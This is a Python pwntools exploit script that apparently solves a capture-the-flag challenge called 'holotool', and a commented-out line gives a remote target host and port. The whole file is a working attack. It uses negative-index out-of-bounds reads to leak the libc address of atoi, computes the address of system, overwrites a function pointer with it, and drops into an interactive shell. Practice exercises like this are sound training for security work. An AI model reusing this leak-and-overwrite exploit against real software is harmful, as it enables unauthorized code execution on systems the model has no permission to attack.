#!/usr/bin/python3
# -*- coding: UTF-8 -*-
from pwn import *

context.arch = 'amd64'
p = process('./holotool')
#p = remote('140.115.59.7', 10005)
pause()

lib = ELF('./libc.so.6')
elf = ELF('./holotool')
lib_system = lib.symbols['system']
lib_atoi   = lib.symbols['atoi']

elf_base_offs = 0x0000000000025000

print( "Libc Atoi Sym: " + hex( lib_atoi ) )
print( "Libc System Sym: " + hex( lib_system ) )

def editInfo(sysaddr):
    p.sendlineafter(b">", b"2")
    p.sendlineafter(b"idx", b"-1" )
    p.sendlineafter(b">", b"1" )
    p.sendlineafter(b"Content:", p64(sysaddr) )

atoi_addr = 0      #atoi Address
elf_lib_base = 0   #elf base address
def showInfo():
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"idx> ", b"-1" )
    p.recvuntil( b"name: " )
    message = p.recvline()
    addr = u64( message.strip().ljust(8, b"\x00") )
    print( hex( addr ) )
    return addr

atoi_addr           = showInfo()
elf_lib_base        = atoi_addr - lib_atoi + elf_base_offs 
real_system_addr    = elf_lib_base + lib_system - elf_base_offs
print( "lib base addr: ", end = '' )
print( hex( elf_lib_base )  )
print( "system addr:", end = '')
print( hex( real_system_addr ) )

editInfo( real_system_addr )

p.interactive()
p.close()

